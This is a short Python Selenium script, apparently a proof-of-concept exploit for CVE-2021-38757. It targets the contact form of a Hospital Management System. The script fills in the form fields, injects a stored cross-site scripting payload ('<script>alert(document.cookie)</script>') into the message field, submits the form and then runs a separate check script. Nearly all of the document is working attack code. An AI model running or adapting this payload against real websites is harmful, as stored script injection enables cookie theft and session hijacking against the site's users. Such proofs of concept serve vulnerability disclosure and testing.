#!/usr/bin/python3
# Author: @nu11secur1ty
# Debug and Developement: @nu11secur1ty 
# CVE-2021-38757

from selenium import webdriver
import time 
import os

#enter the link to the website you want to automate login.
website_link="http://192.168.1.3/Hospital-Management-System-master/contact.html"


browser = webdriver.Chrome()
browser.get((website_link))	

try:
	## The Exploit
	browser.execute_script("document.querySelector('[name=\"txtName\"]').value=\"User\"")
	browser.execute_script("document.querySelector('[name=\"txtEmail\"]').value=\"taratora@abv.bg\"")
	browser.execute_script("document.querySelector('[name=\"txtPhone\"]').value=\"1234567890\"")
	browser.execute_script("document.querySelector('[name=\"txtPhone\"]').value=\"1234567890\"")
	browser.execute_script("document.querySelector('[name=\"txtMsg\"]').value=\"nu11secur1ty<script>alert(document.cookie)</script>\"")
	
	## submit the exploit
	browser.execute_script("document.querySelector('[name=\"btnSubmit\"]').click()")
	
	# Check	
	os.system("python PoC-CVE-2021-38757-Check.py")
	
	print("The payload for CVE CVE-2021-38757 is deployed...\n")
	
except Exception:
	#### This exception occurs if the element are not found in the webpage.
	print("Some error occured :(")
